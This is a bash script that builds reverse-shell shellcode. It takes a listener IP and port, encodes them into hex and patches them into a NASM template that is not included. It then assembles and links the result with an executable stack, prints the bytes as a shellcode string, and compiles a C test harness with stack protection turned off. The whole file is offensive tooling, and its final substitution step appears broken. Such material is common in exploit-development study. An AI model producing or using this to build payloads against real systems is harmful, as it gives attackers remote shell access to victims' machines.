#!/bin/bash
#Filename: compile_reverse_shell.sh
#Author:  MrSquid
#Purpose: Reverse shell compiler. Filename and Ports are easily configurable (see usage)

if [ -z $3 ]; then
	echo "Usage ./compile.sh FILENAME LHOST LPORT"
else
	if [ $3 -gt 65535 ] || [ 1025 -gt $3 ]; then 
		echo "Listening Port must be between 1025 and 65535!"
	else
		cp schema.nasm $1.nasm #Create a new file with the given filename  

		echo "[+] Inserting host and port to code..." #Ip is encoded in hex
		IP_1=`echo $2 | cut -d. -f1`
		IP_2=`echo $2 | cut -d. -f2`
		IP_3=`echo $2 | cut -d. -f3`
		IP_4=`echo $2 | cut -d. -f4`
		IP1=`python -c "import struct; print struct.pack('<L',$IP_1).encode('hex')[:2]"`
		IP2=`python -c "import struct; print struct.pack('<L',$IP_2).encode('hex')[:2]"`
		IP3=`python -c "import struct; print struct.pack('<L',$IP_3).encode('hex')[:2]"`
		IP4=`python -c "import struct; print struct.pack('<L',$IP_4).encode('hex')[:2]"`
		HEX_HOST=0x$IP4$IP3$IP2$IP1
		HEX_PORT=0x`python -c "import struct; print struct.pack('<L',$3).encode('hex')[:4]"`0002 #Given port is set to hex
		replace "LOCALPORT" "$HEX_PORT" -- $1.nasm  #HEX_PORT is written on $1.nasm
		replace "LOCALHOST" "$HEX_HOST" -- $1.nasm #HEX_HOST is written on $1.nasm
		echo '[+] Assembling with Nasm ... '
		nasm -f elf32 -o $1.o $1.nasm

		echo '[+] Linking ...'
		ld -z execstack -o $1 $1.o

		echo '[+] Done!'
		echo
		#rm $1.nasm #Eliminamos lo creado
		rm $1.o

		echo "[+] Shellcode ($2,$3) is..."
		echo 
		objdump -d ./$1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
		echo $objdump 
		sleep 3

		echo "[+] Compiling shellcode.c"

		cp skeleton_shellcode.c shellcode.c  #Copy the skeleton of the shellcode (it contais a string named shellcode which it will be replaced with objdump)

		replace "shellcode" "$objdump" -- shellcode.c &>/dev/null #Replace shellcode dump

		sleep 2

		gcc -fno-stack-protector -z execstack shellcode.c -o shellcode &>/dev/null #Compile and execute the shellcode
	fi
fi
